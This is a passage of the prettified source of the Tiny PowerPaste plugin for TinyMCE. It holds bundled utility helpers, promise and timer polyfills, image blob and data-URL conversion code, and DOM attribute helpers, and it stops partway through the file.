/* Tiny PowerPaste plugin
 *
 * Copyright 2010-2020 Tiny Technologies LLC. All rights reserved.
 *
 * Version: 5.2.2-436
 */

!(function (g) {
  "use strict"
  var n = function (e) {
      return parseInt(e, 10)
    },
    i = function (e, t) {
      var n = e - t
      return 0 === n ? 0 : 0 < n ? 1 : -1
    },
    r = function (e, t, n) {
      return {
        major: e,
        minor: t,
        patch: n,
      }
    },
    o = function (e) {
      var t = /([0-9]+)\.([0-9]+)\.([0-9]+)(?:(\-.+)?)/.exec(e)
      return t ? r(n(t[1]), n(t[2]), n(t[3])) : r(0, 0, 0)
    },
    c = function (e, t) {
      return (
        !!e &&
        -1 ===
          (function (e, t) {
            var n = i(e.major, t.major)
            if (0 !== n) return n
            var r = i(e.minor, t.minor)
            if (0 !== r) return r
            var o = i(e.patch, t.patch)
            return 0 !== o ? o : 0
          })(
            o(
              [(n = e).majorVersion, n.minorVersion]
                .join(".")
                .split(".")
                .slice(0, 3)
                .join(".")
            ),
            o(t)
          )
      )
      var n
    },
    e = function (r, o) {
      return function () {
        for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t]
        var n = r.console
        n && o in n && n[o].apply(n, arguments)
      }
    },
    t = {
      log: e(window, "log"),
      error: e(window, "error"),
      warn: e(window, "warm"),
    },
    s = {
      register: function (e, t) {
        e.addCommand("mceTogglePlainTextPaste", t.toggle)
      },
    },
    L = function () {},
    d = function (n, r) {
      return function () {
        for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t]
        return n(r.apply(null, e))
      }
    },
    y = function (e) {
      return function () {
        return e
      }
    },
    a = function (e) {
      return e
    }
  function b(r) {
    for (var o = [], e = 1; e < arguments.length; e++) o[e - 1] = arguments[e]
    return function () {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t]
      var n = o.concat(e)
      return r.apply(null, n)
    }
  }
  var u,
    f,
    l,
    m,
    p,
    v,
    h,
    T = function (e) {
      return function () {
        throw new Error(e)
      }
    },
    x = y(!1),
    E = y(!0),
    w = function () {
      return S
    },
    S =
      ((u = function (e) {
        return e.isNone()
      }),
      (m = {
        fold: function (e, t) {
          return e()
        },
        is: x,
        isSome: x,
        isNone: E,
        getOr: (l = function (e) {
          return e
        }),
        getOrThunk: (f = function (e) {
          return e()
        }),
        getOrDie: function (e) {
          throw new Error(e || "error: getOrDie called on none.")
        },
        getOrNull: y(null),
        getOrUndefined: y(void 0),
        or: l,
        orThunk: f,
        map: w,
        each: L,
        bind: w,
        exists: x,
        forall: E,
        filter: w,
        equals: u,
        equals_: u,
        toArray: function () {
          return []
        },
        toString: y("none()"),
      }),
      Object.freeze && Object.freeze(m),
      m),
    I = function (n) {
      var e = y(n),
        t = function () {
          return o
        },
        r = function (e) {
          return e(n)
        },
        o = {
          fold: function (e, t) {
            return t(n)
          },
          is: function (e) {
            return n === e
          },
          isSome: E,
          isNone: x,
          getOr: e,
          getOrThunk: e,
          getOrDie: e,
          getOrNull: e,
          getOrUndefined: e,
          or: t,
          orThunk: t,
          map: function (e) {
            return I(e(n))
          },
          each: function (e) {
            e(n)
          },
          bind: r,
          exists: r,
          forall: r,
          filter: function (e) {
            return e(n) ? o : S
          },
          toArray: function () {
            return [n]
          },
          toString: function () {
            return "some(" + n + ")"
          },
          equals: function (e) {
            return e.is(n)
          },
          equals_: function (e, t) {
            return e.fold(x, function (e) {
              return t(n, e)
            })
          },
        }
      return o
    },
    N = {
      some: I,
      none: w,
      from: function (e) {
        return null == e ? S : I(e)
      },
    },
    _ = function (t) {
      return function (e) {
        return (
          (function (e) {
            if (null === e) return "null"
            var t = typeof e
            return "object" === t &&
              (Array.prototype.isPrototypeOf(e) ||
                (e.constructor && "Array" === e.constructor.name))
              ? "array"
              : "object" === t &&
                (String.prototype.isPrototypeOf(e) ||
                  (e.constructor && "String" === e.constructor.name))
              ? "string"
              : t
          })(e) === t
        )
      }
    },
    C = _("string"),
    O = _("object"),
    D = _("array"),
    P = _("boolean"),
    A = _("function"),
    k = _("number"),
    M = Array.prototype.slice,
    R = Array.prototype.indexOf,
    F = Array.prototype.push,
    j = function (e, t) {
      return (n = e), (r = t), -1 < R.call(n, r)
      var n, r
    },
    U = function (e, t) {
      for (var n = 0, r = e.length; n < r; n++) {
        if (t(e[n], n)) return !0
      }
      return !1
    },
    B = function (e, t) {
      for (var n = e.length, r = new Array(n), o = 0; o < n; o++) {
        var i = e[o]
        r[o] = t(i, o)
      }
      return r
    },
    Y = function (e, t) {
      for (var n = 0, r = e.length; n < r; n++) {
        t(e[n], n)
      }
    },
    W = function (e, t) {
      for (var n = [], r = [], o = 0, i = e.length; o < i; o++) {
        var a = e[o]
        ;(t(a, o) ? n : r).push(a)
      }
      return {
        pass: n,
        fail: r,
      }
    },
    H = function (e, t) {
      for (var n = [], r = 0, o = e.length; r < o; r++) {
        var i = e[r]
        t(i, r) && n.push(i)
      }
      return n
    },
    q = function (e, t, n) {
      return (
        Y(e, function (e) {
          n = t(n, e)
        }),
        n
      )
    },
    $ = function (e, t) {
      for (var n = 0, r = e.length; n < r; n++) {
        var o = e[n]
        if (t(o, n)) return N.some(o)
      }
      return N.none()
    },
    V = function (e, t) {
      for (var n = 0, r = e.length; n < r; n++) {
        if (t(e[n], n)) return N.some(n)
      }
      return N.none()
    },
    X = function (e) {
      for (var t = [], n = 0, r = e.length; n < r; ++n) {
        if (!D(e[n]))
          throw new Error(
            "Arr.flatten item " + n + " was not an array, input: " + e
          )
        F.apply(t, e[n])
      }
      return t
    },
    G = function (e, t) {
      var n = B(e, t)
      return X(n)
    },
    K = function (e, t) {
      for (var n = 0, r = e.length; n < r; ++n) {
        if (!0 !== t(e[n], n)) return !1
      }
      return !0
    },
    z =
      (A(Array.from) && Array.from,
      function (e) {
        return e.getParam("powerpaste_block_drop", !1, "boolean")
      }),
    J = function (e) {
      return void 0 !== e.settings.images_upload_url
    },
    Z = function (e) {
      return e.getParam("paste_as_text", !1)
    },
    Q = function (e) {
      return e.getParam("automatic_uploads", !0, "boolean")
    },
    ee = function (e) {
      return e.getParam("powerpaste_keep_unsupported_src", !1, "boolean")
    },
    te = function (e) {
      var t = e.getParam("powerpaste_clean_filtered_inline_elements")
      return C(t)
        ? B(t.split(","), function (e) {
            return e.trim()
          })
        : []
    },
    ne = function (e, t) {
      e.dom.bind(
        t,
        "drop dragstart dragend dragover dragenter dragleave dragdrop draggesture",
        function (e) {
          e.preventDefault(), e.stopImmediatePropagation()
        }
      )
    },
    re = function (t) {
      t.on("init", function (e) {
        ne(t, t.getBody()), t.inline || ne(t, t.getDoc())
      })
    },
    oe = function () {
      return (oe =
        Object.assign ||
        function (e) {
          for (var t, n = 1, r = arguments.length; n < r; n++)
            for (var o in (t = arguments[n]))
              Object.prototype.hasOwnProperty.call(t, o) && (e[o] = t[o])
          return e
        }).apply(this, arguments)
    },
    ie = Object.keys,
    ae = function (e, t) {
      for (var n = ie(e), r = 0, o = n.length; r < o; r++) {
        var i = n[r]
        t(e[i], i)
      }
    },
    ue = function (e, n) {
      return ce(e, function (e, t) {
        return {
          k: t,
          v: n(e, t),
        }
      })
    },
    ce = function (e, r) {
      var o = {}
      return (
        ae(e, function (e, t) {
          var n = r(e, t)
          o[n.k] = n.v
        }),
        o
      )
    },
    se = function (e, n) {
      var r = []
      return (
        ae(e, function (e, t) {
          r.push(n(e, t))
        }),
        r
      )
    },
    fe = function (e) {
      return se(e, function (e) {
        return e
      })
    },
    le = function (e) {
      return ie(e).length
    },
    de = function (a) {
      if (!D(a)) throw new Error("cases must be an array")
      if (0 === a.length) throw new Error("there must be at least one case")
      var u = [],
        n = {}
      return (
        Y(a, function (e, r) {
          var t = ie(e)
          if (1 !== t.length) throw new Error("one and only one name per case")
          var o = t[0],
            i = e[o]
          if (void 0 !== n[o]) throw new Error("duplicate key detected:" + o)
          if ("cata" === o)
            throw new Error("cannot have a case named cata (sorry)")
          if (!D(i)) throw new Error("case arguments must be an array")
          u.push(o),
            (n[o] = function () {
              var e = arguments.length
              if (e !== i.length)
                throw new Error(
                  "Wrong number of arguments to case " +
                    o +
                    ". Expected " +
                    i.length +
                    " (" +
                    i +
                    "), got " +
                    e
                )
              for (var n = new Array(e), t = 0; t < n.length; t++)
                n[t] = arguments[t]
              return {
                fold: function () {
                  if (arguments.length !== a.length)
                    throw new Error(
                      "Wrong number of arguments to fold. Expected " +
                        a.length +
                        ", got " +
                        arguments.length
                    )
                  return arguments[r].apply(null, n)
                },
                match: function (e) {
                  var t = ie(e)
                  if (u.length !== t.length)
                    throw new Error(
                      "Wrong number of arguments to match. Expected: " +
                        u.join(",") +
                        "\nActual: " +
                        t.join(",")
                    )
                  if (
                    !K(u, function (e) {
                      return j(t, e)
                    })
                  )
                    throw new Error(
                      "Not all branches were specified when using match. Specified: " +
                        t.join(", ") +
                        "\nRequired: " +
                        u.join(", ")
                    )
                  return e[o].apply(null, n)
                },
                log: function (e) {
                  g.console.log(e, {
                    constructors: u,
                    constructor: o,
                    params: n,
                  })
                },
              }
            })
        }),
        n
      )
    },
    me = de([
      {
        blob: ["id", "imageresult", "objurl"],
      },
      {
        url: ["id", "url", "raw"],
      },
    ]),
    pe = oe(
      {
        cata: function (e, t, n) {
          return e.fold(t, n)
        },
      },
      me
    ),
    ge = {},
    ve = {
      exports: ge,
    }
  ;(v = ge),
    (h = ve),
    (p = void 0),
    (function (e) {
      "object" == typeof v && void 0 !== h
        ? (h.exports = e())
        : "function" == typeof p && p.amd
        ? p([], e)
        : (("undefined" != typeof window
            ? window
            : "undefined" != typeof global
            ? global
            : "undefined" != typeof self
            ? self
            : this
          ).EphoxContactWrapper = e())
    })(function () {
      return (function i(a, u, c) {
        function s(t, e) {
          if (!u[t]) {
            if (!a[t]) {
              var n = !1
              if (!e && n) return n(t, !0)
              if (f) return f(t, !0)
              var r = new Error("Cannot find module '" + t + "'")
              throw ((r.code = "MODULE_NOT_FOUND"), r)
            }
            var o = (u[t] = {
              exports: {},
            })
            a[t][0].call(
              o.exports,
              function (e) {
                return s(a[t][1][e] || e)
              },
              o,
              o.exports,
              i,
              a,
              u,
              c
            )
          }
          return u[t].exports
        }
        for (var f = !1, e = 0; e < c.length; e++) s(c[e])
        return s
      })(
        {
          1: [
            function (e, t, n) {
              var r,
                o,
                i = (t.exports = {})
              function a() {
                throw new Error("setTimeout has not been defined")
              }
              function u() {
                throw new Error("clearTimeout has not been defined")
              }
              function c(t) {
                if (r === setTimeout) return setTimeout(t, 0)
                if ((r === a || !r) && setTimeout)
                  return (r = setTimeout), setTimeout(t, 0)
                try {
                  return r(t, 0)
                } catch (e) {
                  try {
                    return r.call(null, t, 0)
                  } catch (e) {
                    return r.call(this, t, 0)
                  }
                }
              }
              !(function () {
                try {
                  r = "function" == typeof setTimeout ? setTimeout : a
                } catch (e) {
                  r = a
                }
                try {
                  o = "function" == typeof clearTimeout ? clearTimeout : u
                } catch (e) {
                  o = u
                }
              })()
              var s,
                f = [],
                l = !1,
                d = -1
              function m() {
                l &&
                  s &&
                  ((l = !1),
                  s.length ? (f = s.concat(f)) : (d = -1),
                  f.length && p())
              }
              function p() {
                if (!l) {
                  var e = c(m)
                  l = !0
                  for (var t = f.length; t; ) {
                    for (s = f, f = []; ++d < t; ) s && s[d].run()
                    ;(d = -1), (t = f.length)
                  }
                  ;(s = null),
                    (l = !1),
                    (function (t) {
                      if (o === clearTimeout) return clearTimeout(t)
                      if ((o === u || !o) && clearTimeout)
                        return (o = clearTimeout), clearTimeout(t)
                      try {
                        o(t)
                      } catch (e) {
                        try {
                          return o.call(null, t)
                        } catch (e) {
                          return o.call(this, t)
                        }
                      }
                    })(e)
                }
              }
              function g(e, t) {
                ;(this.fun = e), (this.array = t)
              }
              function v() {}
              ;(i.nextTick = function (e) {
                var t = new Array(arguments.length - 1)
                if (1 < arguments.length)
                  for (var n = 1; n < arguments.length; n++)
                    t[n - 1] = arguments[n]
                f.push(new g(e, t)), 1 !== f.length || l || c(p)
              }),
                (g.prototype.run = function () {
                  this.fun.apply(null, this.array)
                }),
                (i.title = "browser"),
                (i.browser = !0),
                (i.env = {}),
                (i.argv = []),
                (i.version = ""),
                (i.versions = {}),
                (i.on = v),
                (i.addListener = v),
                (i.once = v),
                (i.off = v),
                (i.removeListener = v),
                (i.removeAllListeners = v),
                (i.emit = v),
                (i.prependListener = v),
                (i.prependOnceListener = v),
                (i.listeners = function (e) {
                  return []
                }),
                (i.binding = function (e) {
                  throw new Error("process.binding is not supported")
                }),
                (i.cwd = function () {
                  return "/"
                }),
                (i.chdir = function (e) {
                  throw new Error("process.chdir is not supported")
                }),
                (i.umask = function () {
                  return 0
                })
            },
            {},
          ],
          2: [
            function (e, l, t) {
              ;(function (n) {
                !(function (e) {
                  var t = setTimeout
                  function r() {}
                  function i(e) {
                    if ("object" != typeof this)
                      throw new TypeError(
                        "Promises must be constructed via new"
                      )
                    if ("function" != typeof e)
                      throw new TypeError("not a function")
                    ;(this._state = 0),
                      (this._handled = !1),
                      (this._value = void 0),
                      (this._deferreds = []),
                      f(e, this)
                  }
                  function o(n, r) {
                    for (; 3 === n._state; ) n = n._value
                    0 !== n._state
                      ? ((n._handled = !0),
                        i._immediateFn(function () {
                          var e = 1 === n._state ? r.onFulfilled : r.onRejected
                          if (null !== e) {
                            var t
                            try {
                              t = e(n._value)
                            } catch (e) {
                              return void u(r.promise, e)
                            }
                            a(r.promise, t)
                          } else (1 === n._state ? a : u)(r.promise, n._value)
                        }))
                      : n._deferreds.push(r)
                  }
                  function a(t, e) {
                    try {
                      if (e === t)
                        throw new TypeError(
                          "A promise cannot be resolved with itself."
                        )
                      if (
                        e &&
                        ("object" == typeof e || "function" == typeof e)
                      ) {
                        var n = e.then
                        if (e instanceof i)
                          return (t._state = 3), (t._value = e), void c(t)
                        if ("function" == typeof n)
                          return void f(
                            ((r = n),
                            (o = e),
                            function () {
                              r.apply(o, arguments)
                            }),
                            t
                          )
                      }
                      ;(t._state = 1), (t._value = e), c(t)
                    } catch (e) {
                      u(t, e)
                    }
                    var r, o
                  }
                  function u(e, t) {
                    ;(e._state = 2), (e._value = t), c(e)
                  }
                  function c(e) {
                    2 === e._state &&
                      0 === e._deferreds.length &&
                      i._immediateFn(function () {
                        e._handled || i._unhandledRejectionFn(e._value)
                      })
                    for (var t = 0, n = e._deferreds.length; t < n; t++)
                      o(e, e._deferreds[t])
                    e._deferreds = null
                  }
                  function s(e, t, n) {
                    ;(this.onFulfilled = "function" == typeof e ? e : null),
                      (this.onRejected = "function" == typeof t ? t : null),
                      (this.promise = n)
                  }
                  function f(e, t) {
                    var n = !1
                    try {
                      e(
                        function (e) {
                          n || ((n = !0), a(t, e))
                        },
                        function (e) {
                          n || ((n = !0), u(t, e))
                        }
                      )
                    } catch (e) {
                      if (n) return
                      ;(n = !0), u(t, e)
                    }
                  }
                  ;(i.prototype.catch = function (e) {
                    return this.then(null, e)
                  }),
                    (i.prototype.then = function (e, t) {
                      var n = new this.constructor(r)
                      return o(this, new s(e, t, n)), n
                    }),
                    (i.all = function (e) {
                      var u = Array.prototype.slice.call(e)
                      return new i(function (r, o) {
                        if (0 === u.length) return r([])
                        var i = u.length
                        function a(t, e) {
                          try {
                            if (
                              e &&
                              ("object" == typeof e || "function" == typeof e)
                            ) {
                              var n = e.then
                              if ("function" == typeof n)
                                return void n.call(
                                  e,
                                  function (e) {
                                    a(t, e)
                                  },
                                  o
                                )
                            }
                            ;(u[t] = e), 0 == --i && r(u)
                          } catch (e) {
                            o(e)
                          }
                        }
                        for (var e = 0; e < u.length; e++) a(e, u[e])
                      })
                    }),
                    (i.resolve = function (t) {
                      return t && "object" == typeof t && t.constructor === i
                        ? t
                        : new i(function (e) {
                            e(t)
                          })
                    }),
                    (i.reject = function (n) {
                      return new i(function (e, t) {
                        t(n)
                      })
                    }),
                    (i.race = function (o) {
                      return new i(function (e, t) {
                        for (var n = 0, r = o.length; n < r; n++)
                          o[n].then(e, t)
                      })
                    }),
                    (i._immediateFn =
                      "function" == typeof n
                        ? function (e) {
                            n(e)
                          }
                        : function (e) {
                            t(e, 0)
                          }),
                    (i._unhandledRejectionFn = function (e) {
                      "undefined" != typeof console &&
                        console &&
                        console.warn("Possible Unhandled Promise Rejection:", e)
                    }),
                    (i._setImmediateFn = function (e) {
                      i._immediateFn = e
                    }),
                    (i._setUnhandledRejectionFn = function (e) {
                      i._unhandledRejectionFn = e
                    }),
                    void 0 !== l && l.exports
                      ? (l.exports = i)
                      : e.Promise || (e.Promise = i)
                })(this)
              }.call(this, e("timers").setImmediate))
            },
            {
              timers: 3,
            },
          ],
          3: [
            function (c, e, s) {
              ;(function (e, t) {
                var r = c("process/browser.js").nextTick,
                  n = Function.prototype.apply,
                  o = Array.prototype.slice,
                  i = {},
                  a = 0
                function u(e, t) {
                  ;(this._id = e), (this._clearFn = t)
                }
                ;(s.setTimeout = function () {
                  return new u(
                    n.call(setTimeout, window, arguments),
                    clearTimeout
                  )
                }),
                  (s.setInterval = function () {
                    return new u(
                      n.call(setInterval, window, arguments),
                      clearInterval
                    )
                  }),
                  (s.clearTimeout = s.clearInterval =
                    function (e) {
                      e.close()
                    }),
                  (u.prototype.unref = u.prototype.ref = function () {}),
                  (u.prototype.close = function () {
                    this._clearFn.call(window, this._id)
                  }),
                  (s.enroll = function (e, t) {
                    clearTimeout(e._idleTimeoutId), (e._idleTimeout = t)
                  }),
                  (s.unenroll = function (e) {
                    clearTimeout(e._idleTimeoutId), (e._idleTimeout = -1)
                  }),
                  (s._unrefActive = s.active =
                    function (e) {
                      clearTimeout(e._idleTimeoutId)
                      var t = e._idleTimeout
                      0 <= t &&
                        (e._idleTimeoutId = setTimeout(function () {
                          e._onTimeout && e._onTimeout()
                        }, t))
                    }),
                  (s.setImmediate =
                    "function" == typeof e
                      ? e
                      : function (e) {
                          var t = a++,
                            n = !(arguments.length < 2) && o.call(arguments, 1)
                          return (
                            (i[t] = !0),
                            r(function () {
                              i[t] &&
                                (n ? e.apply(null, n) : e.call(null),
                                s.clearImmediate(t))
                            }),
                            t
                          )
                        }),
                  (s.clearImmediate =
                    "function" == typeof t
                      ? t
                      : function (e) {
                          delete i[e]
                        })
              }.call(
                this,
                c("timers").setImmediate,
                c("timers").clearImmediate
              ))
            },
            {
              "process/browser.js": 1,
              timers: 3,
            },
          ],
          4: [
            function (e, t, n) {
              var r = e("promise-polyfill"),
                o =
                  "undefined" != typeof window
                    ? window
                    : Function("return this;")()
              t.exports = {
                boltExport: o.Promise || r,
              }
            },
            {
              "promise-polyfill": 2,
            },
          ],
        },
        {},
        [4]
      )(4)
    })
  var he = ve.exports.boltExport,
    ye = function (e) {
      var n = N.none(),
        t = [],
        r = function (e) {
          o() ? a(e) : t.push(e)
        },
        o = function () {
          return n.isSome()
        },
        i = function (e) {
          Y(e, a)
        },
        a = function (t) {
          n.each(function (e) {
            g.setTimeout(function () {
              t(e)
            }, 0)
          })
        }
      return (
        e(function (e) {
          ;(n = N.some(e)), i(t), (t = [])
        }),
        {
          get: r,
          map: function (n) {
            return ye(function (t) {
              r(function (e) {
                t(n(e))
              })
            })
          },
          isReady: o,
        }
      )
    },
    be = {
      nu: ye,
      pure: function (t) {
        return ye(function (e) {
          e(t)
        })
      },
    },
    Te = function (e) {
      g.setTimeout(function () {
        throw e
      }, 0)
    },
    xe = function (n) {
      var e = function (e) {
        n().then(e, Te)
      }
      return {
        map: function (e) {
          return xe(function () {
            return n().then(e)
          })
        },
        bind: function (t) {
          return xe(function () {
            return n().then(function (e) {
              return t(e).toPromise()
            })
          })
        },
        anonBind: function (e) {
          return xe(function () {
            return n().then(function () {
              return e.toPromise()
            })
          })
        },
        toLazy: function () {
          return be.nu(e)
        },
        toCached: function () {
          var e = null
          return xe(function () {
            return null === e && (e = n()), e
          })
        },
        toPromise: n,
        get: e,
      }
    },
    Ee = {
      nu: function (e) {
        return xe(function () {
          return new he(e)
        })
      },
      pure: function (e) {
        return xe(function () {
          return he.resolve(e)
        })
      },
    },
    we = function (a, e) {
      return e(function (r) {
        var o = [],
          i = 0
        0 === a.length
          ? r([])
          : Y(a, function (e, t) {
              var n
              e.get(
                ((n = t),
                function (e) {
                  ;(o[n] = e), ++i >= a.length && r(o)
                })
              )
            })
      })
    },
    Se = function (e) {
      return we(e, Ee.nu)
    },
    Ie = function (e, t) {
      return Se(B(e, t))
    },
    Le = Ie,
    Ne = 0,
    _e = function (e) {
      var t = new Date().getTime()
      return e + "_" + Math.floor(1e9 * Math.random()) + ++Ne + String(t)
    }
  function Ce(e, t) {
    return (
      (n = g.document.createElement("canvas")),
      (r = e),
      (o = t),
      (n.width = r),
      (n.height = o),
      n
    )
    var n, r, o
  }
  function Oe(e) {
    var t = Ce(e.width, e.height)
    return De(t).drawImage(e, 0, 0), t
  }
  function De(e) {
    return e.getContext("2d")
  }
  var Pe = window.Promise
    ? window.Promise
    : (function () {
        var i = function (e) {
            if ("object" != typeof this)
              throw new TypeError("Promises must be constructed via new")
            if ("function" != typeof e) throw new TypeError("not a function")
            ;(this._state = null),
              (this._value = null),
              (this._deferreds = []),
              f(e, n(o, this), n(u, this))
          },
          e =
            i.immediateFn ||
            ("function" == typeof window.setImmediate && window.setImmediate) ||
            function (e) {
              g.setTimeout(e, 1)
            }
        function n(e, t) {
          return function () {
            return e.apply(t, arguments)
          }
        }
        var r =
          Array.isArray ||
          function (e) {
            return "[object Array]" === Object.prototype.toString.call(e)
          }
        function a(n) {
          var r = this
          null !== this._state
            ? e(function () {
                var e = r._state ? n.onFulfilled : n.onRejected
                if (null !== e) {
                  var t
                  try {
                    t = e(r._value)
                  } catch (e) {
                    return void n.reject(e)
                  }
                  n.resolve(t)
                } else (r._state ? n.resolve : n.reject)(r._value)
              })
            : this._deferreds.push(n)
        }
        function o(e) {
          try {
            if (e === this)
              throw new TypeError("A promise cannot be resolved with itself.")
            if (e && ("object" == typeof e || "function" == typeof e)) {
              var t = e.then
              if ("function" == typeof t)
                return void f(n(t, e), n(o, this), n(u, this))
            }
            ;(this._state = !0), (this._value = e), c.call(this)
          } catch (e) {
            u.call(this, e)
          }
        }
        function u(e) {
          ;(this._state = !1), (this._value = e), c.call(this)
        }
        function c() {
          for (var e = 0, t = this._deferreds; e < t.length; e++) {
            var n = t[e]
            a.call(this, n)
          }
          this._deferreds = []
        }
        function s(e, t, n, r) {
          ;(this.onFulfilled = "function" == typeof e ? e : null),
            (this.onRejected = "function" == typeof t ? t : null),
            (this.resolve = n),
            (this.reject = r)
        }
        function f(e, t, n) {
          var r = !1
          try {
            e(
              function (e) {
                r || ((r = !0), t(e))
              },
              function (e) {
                r || ((r = !0), n(e))
              }
            )
          } catch (e) {
            if (r) return
            ;(r = !0), n(e)
          }
        }
        return (
          (i.prototype.catch = function (e) {
            return this.then(null, e)
          }),
          (i.prototype.then = function (n, r) {
            var o = this
            return new i(function (e, t) {
              a.call(o, new s(n, r, e, t))
            })
          }),
          (i.all = function () {
            for (var e = [], t = 0; t < arguments.length; t++)
              e[t] = arguments[t]
            var u = Array.prototype.slice.call(
              1 === e.length && r(e[0]) ? e[0] : e
            )
            return new i(function (r, o) {
              if (0 === u.length) return r([])
              var i = u.length
              function a(t, e) {
                try {
                  if (e && ("object" == typeof e || "function" == typeof e)) {
                    var n = e.then
                    if ("function" == typeof n)
                      return void n.call(
                        e,
                        function (e) {
                          a(t, e)
                        },
                        o
                      )
                  }
                  ;(u[t] = e), 0 == --i && r(u)
                } catch (e) {
                  o(e)
                }
              }
              for (var e = 0; e < u.length; e++) a(e, u[e])
            })
          }),
          (i.resolve = function (t) {
            return t && "object" == typeof t && t.constructor === i
              ? t
              : new i(function (e) {
                  e(t)
                })
          }),
          (i.reject = function (n) {
            return new i(function (e, t) {
              t(n)
            })
          }),
          (i.race = function (o) {
            return new i(function (e, t) {
              for (var n = 0, r = o; n < r.length; n++) r[n].then(e, t)
            })
          }),
          i
        )
      })()
  function Ae(r) {
    return new Pe(function (e, n) {
      var t = new g.XMLHttpRequest()
      t.open("GET", r, !0),
        (t.responseType = "blob"),
        (t.onload = function () {
          200 === this.status && e(this.response)
        }),
        (t.onerror = function () {
          var e,
            t = this
          n(
            0 === this.status
              ? (((e = new Error("No access to download image")).code = 18),
                (e.name = "SecurityError"),
                e)
              : new Error("Error " + t.status + " downloading image")
          )
        }),
        t.send()
    })
  }
  function ke(e) {
    var t = e.split(","),
      n = /data:([^;]+)/.exec(t[0])
    if (!n) return N.none()
    for (
      var r = n[1],
        o = t[1],
        i = g.atob(o),
        a = i.length,
        u = Math.ceil(a / 1024),
        c = new Array(u),
        s = 0;
      s < u;
      ++s
    ) {
      for (
        var f = 1024 * s,
          l = Math.min(f + 1024, a),
          d = new Array(l - f),
          m = f,
          p = 0;
        m < l;
        ++p, ++m
      )
        d[p] = i[m].charCodeAt(0)
      c[s] = new Uint8Array(d)
    }
    return N.some(
      new g.Blob(c, {
        type: r,
      })
    )
  }
  function Me(n) {
    return new Pe(function (e, t) {
      ke(n).fold(function () {
        t("uri is not base64: " + n)
      }, e)
    })
  }
  function Re(e, r, o) {
    return (
      (r = r || "image/png"),
      g.HTMLCanvasElement.prototype.toBlob
        ? new Pe(function (t, n) {
            e.toBlob(
              function (e) {
                e ? t(e) : n()
              },
              r,
              o
            )
          })
        : Me(e.toDataURL(r, o))
    )
  }
  function Fe(e) {
    return ((u = e),
    new Pe(function (e, t) {
      var n = g.URL.createObjectURL(u),
        r = new g.Image(),
        o = function () {
          r.removeEventListener("load", i), r.removeEventListener("error", a)
        }
      function i() {
        o(), e(r)
      }
      function a() {
        o(), t("Unable to load data of type " + u.type + ": " + n)
      }
      r.addEventListener("load", i),
        r.addEventListener("error", a),
        (r.src = n),
        r.complete && i()
    })).then(function (e) {
      var t
      ;(t = e), g.URL.revokeObjectURL(t.src)
      var n,
        r,
        o = Ce(
          (r = e).naturalWidth || r.width,
          (n = e).naturalHeight || n.height
        )
      return De(o).drawImage(e, 0, 0), o
    })
    var u
  }
  function je(n) {
    return new Pe(function (e) {
      var t = new g.FileReader()
      ;(t.onloadend = function () {
        e(t.result)
      }),
        t.readAsDataURL(n)
    })
  }
  var Ue = function (e) {
    return N.from(
      0 === (t = e).indexOf("blob:")
        ? Ae(t)
        : 0 === t.indexOf("data:")
        ? Me(t)
        : null
    )
    var t
  }
  function Be(e, t, n) {
    var r = t.type
    function o(r, o) {
      return e.then(function (e) {
        return (n = o), (t = (t = r) || "image/png"), e.toDataURL(t, n)
        var t, n
      })
    }
    return {
      getType: y(r),
      toBlob: function () {
        return Pe.resolve(t)
      },
      toDataURL: function () {
        return n
      },
      toBase64: function () {
        return n.split(",")[1]
      },
      toAdjustedBlob: function (t, n) {
        return e.then(function (e) {
          return Re(e, t, n)
        })
      },
      toAdjustedDataURL: o,
      toAdjustedBase64: function (e, t) {
        return o(e, t).then(function (e) {
          return e.split(",")[1]
        })
      },
      toCanvas: function () {
        return e.then(Oe)
      },
    }
  }
  function Ye(e) {
    return ((t = e),
    (n = t.src),
    0 === n.indexOf("data:") ? Me(n) : Ae(n)).then(function (e) {
      return je((t = e)).then(function (e) {
        return Be(Fe(t), t, e)
      })
      var t
    })
    var t, n
  }
  var We,
    He,
    qe = function (e, t) {
      return (r = t), Be(Fe((n = e)), n, r)
      var n, r
    },
    $e = function (e, t, n) {
      return void 0 === t && void 0 === n ? Ve(e) : e.toAdjustedBlob(t, n)
    },
    Ve = function (e) {
      return e.toBlob()
    },
    Xe = function (e) {
      return e.toDataURL()
    },
    Ge = function (e) {
      var t = g.URL.createObjectURL(e)
      return Ke(e, t)
    },
    Ke = function (i, a) {
      return Ee.nu(function (o) {
        var e
        ;((e = i), je(e)).then(function (e) {
          var t = qe(i, e),
            n = _e("image"),
            r = pe.blob(n, t, a)
          o(r)
        })
      })
    },
    ze = function (e) {
      return Ie(e, Ge)
    },
    Je =
      (g.Node.ATTRIBUTE_NODE, g.Node.CDATA_SECTION_NODE, g.Node.COMMENT_NODE),
    Ze = g.Node.DOCUMENT_NODE,
    Qe =
      (g.Node.DOCUMENT_TYPE_NODE,
      g.Node.DOCUMENT_FRAGMENT_NODE,
      g.Node.ELEMENT_NODE),
    et = g.Node.TEXT_NODE,
    tt =
      (g.Node.PROCESSING_INSTRUCTION_NODE,
      g.Node.ENTITY_REFERENCE_NODE,
      g.Node.ENTITY_NODE,
      g.Node.NOTATION_NODE,
      void 0 !== g.window ? g.window : Function("return this;")()),
    nt = function (e, t) {
      return (function (e, t) {
        for (var n = null != t ? t : tt, r = 0; r < e.length && null != n; ++r)
          n = n[e[r]]
        return n
      })(e.split("."), t)
    },
    rt = function (e, t) {
      return (function (e, t) {
        for (var n, r, o = void 0 !== t ? t : tt, i = 0; i < e.length; ++i)
          (n = o),
            (r = e[i]),
            (void 0 !== n[r] && null !== n[r]) || (n[r] = {}),
            (o = n[r])
        return o
      })(e.split("."), t)
    },
    ot = function (e) {
      return e.dom().nodeName.toLowerCase()
    },
    it = function (e) {
      return e.dom().nodeType
    },
    at = function (t) {
      return function (e) {
        return it(e) === t
      }
    },
    ut = function (e) {
      return it(e) === Je || "#comment" === ot(e)
    },
    ct = at(Qe),
    st = at(et),
    ft = function (e, t, n) {
      if (!(C(n) || P(n) || k(n)))
        throw (
          (g.console.error(
            "Invalid call to Attr.set. Key ",
            t,
            ":: Value ",
            n,
            ":: Element ",
            e
          ),
          new Error("Attribute value was not simple"))
        )
      e.setAttribute(t, n + "")
    },
    lt = function (e, t, n) {
      ft(e.dom(), t, n)
    },
    dt = function (e, t) {
      var n = e.dom()
      ae(t, function (e, t) {
        ft(n, t, e)
      })
    },
    mt = function (e, t) {
      var n = e.dom().getAttribute(t)
      return null === n ? void 0 : n
    },
